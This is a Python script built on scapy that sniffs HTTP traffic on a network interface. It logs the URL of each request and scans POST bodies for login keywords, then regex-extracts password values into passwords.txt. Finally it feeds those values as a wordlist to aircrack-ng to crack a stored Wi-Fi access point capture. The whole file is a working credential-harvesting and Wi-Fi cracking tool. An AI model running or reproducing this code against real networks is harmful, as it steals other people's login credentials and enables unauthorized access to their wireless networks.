#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http                                           #third party module to filter http since scapy do not filter http layer
import optparse
from harun_color import color
import re, os

def get_arguements():
    parser = optparse.OptionParser()                                             #stores all the data received by class OptionParser
    parser.add_option("-i", "--interface", dest="interface", help="Interface")               #for adding the options  to  input argements
    options=parser.parse_args() [0]                                               #provides two elements values and arguements

                            #checkimg whether range is specified
    if not options.interface:
        parser.error("[-]Please specify the interface,use --help for more info")

    return options

def list_passwords(login_info_keyword_list):
    matched_password = '(?:.*?' + login_info_keyword_list[0] + '.*?=)(.*?)[&\\s\\r\\n]'
    passwords_list =  re.findall(matched_password, login_info_keyword_list[1] + " ")
    print(passwords_list)
    if passwords_list:
        store_password(passwords_list)
        crack_password()

def store_password(passwords_list):
    with open('passwords.txt', 'a') as out_file:
        try:
            os.remove("temp_passwords.txt")
        except Exception:
            pass
        with open('temp_passwords.txt', 'a') as temp_out_file:
            for password in passwords_list:
                temp_out_file.write(password)
                temp_out_file.write("\n")
                out_file.write(password)
                out_file.write("\n")

def crack_password():
    if os.path.exists("ap_info.txt") and os.path.exists("temp_passwords.txt"):
        with open('ap_info.txt', 'r') as out_file:
            ap_info = out_file.read()
            ap_info = ap_info.strip()
            info_list = ap_info.split("=")
            bssid = "--bssid " + info_list[0]
            crack_command = "xterm -hold -e 'aircrack-ng " + info_list[1] + " -w temp_passwords.txt' &" 
            os.system(crack_command)

def sniff(interface):                                                      #prn to execute another function when it catches a packet
    scapy.sniff(iface=interface,store=False,prn=process_sniffed_packet)     #store=False for not store the output,
    #scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet,filter ="udp")     #filter to filter the packet like udp,port 21
    
def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path  # appending host with path fields to form url in httprequest layer

def get_login_info(packet):
    load = packet[scapy.Raw].load                                          #load is a field in packet with usernames and passwords
    keywords = ["login", "email", "username","usr" "uname", "passsword", "passwd", "pass", "key"]            #list of possible keywords
    for keyword in keywords:                                                                    #checking each field in load field
        if keyword in load:
            load_keyword_list = [keyword, load]
            return load_keyword_list

def process_sniffed_packet(packet):                                          #filtering the packet
    if packet.haslayer(http.HTTPRequest):                                   #checks whether packet has http layer
                                                                            #http is module and HTTPRequest is layer
        url=get_url(packet)
        print(color("[+]HTTP REQUESTED >>","green")+color(url,"yellow"))
                                                                            #print(packet.show())  #to see the fields of the layer
        if packet.haslayer(scapy.Raw):                                       #checks another layer raw(post is used in http to hide data in link)
            login_info_keyword_list=get_login_info(packet)
            if login_info_keyword_list:
                print("[+] Found with key >>" + login_info_keyword_list[0])
                print("\n\n"+color("[+]Possible username/password >","green") + color(login_info_keyword_list[1], "blue")+ "\n\n")
                list_passwords(login_info_keyword_list)

options=get_arguements()
sniff(options.interface)
